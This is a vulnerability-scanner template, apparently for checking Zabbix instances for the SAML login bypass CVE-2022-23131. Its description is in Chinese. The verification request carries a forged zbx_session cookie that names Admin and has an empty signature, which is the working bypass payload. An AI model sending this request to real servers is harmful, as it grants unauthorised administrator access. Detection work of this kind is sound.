app: Zabbix
query: app:"Zabbix"
meta:
  name: Zabbix登录绕过漏洞(CVE-2022-23131)
  level: 5
  tags:
    - ultra_vires
  description: |-
    安全断言标记语言 (SAML) 是最常见的单点登录 (SSO) 标准之一。围绕 XML 实现，它允许身份提供者（IdP，一个能够对用户进行身份验证的实体）告诉服务提供者（SP，这里是 Zabbix）你是谁。您可以将Zabbix Web 前端配置为允许通过 SAML 进行用户身份验证，但默认情况下不启用它，因为它需要了解身份提供者的详细信息。这是企业部署最常见的设置。
    
    在启用 SAML SSO 身份验证的实例上，它允许绕过身份验证并获得管理员权限。攻击者可以使用此访问权限在链接的Zabbix Server和Zabbix Agent实例上执行任意命令。
  homepage: https://www.zabbix.com/
  author: 一曲成殇
  references: https://blog.csdn.net/MrHatSec/article/details/123997989
  solution: 升级系统版本
  steps:
    verify_steps:
      type: and
      verify:
        - request:
            method: GET
            path: /index_sso.php
            redirect: false
            header:
              - Cookie: zbx_session=eyJzYW1sX2RhdGEiOnsidXNlcm5hbWVfYXR0cmlidXRlIjoiQWRtaW4ifSwic2Vzc2lvbmlkIjoiIiwic2lnbiI6IiJ9
            params: ""
          response:
            - name: code
              value: "302"
              type: equals
            - name: header
              value: zabbix.php?action
              type: contains
  create_at: "2022-04-27 15:44:13"
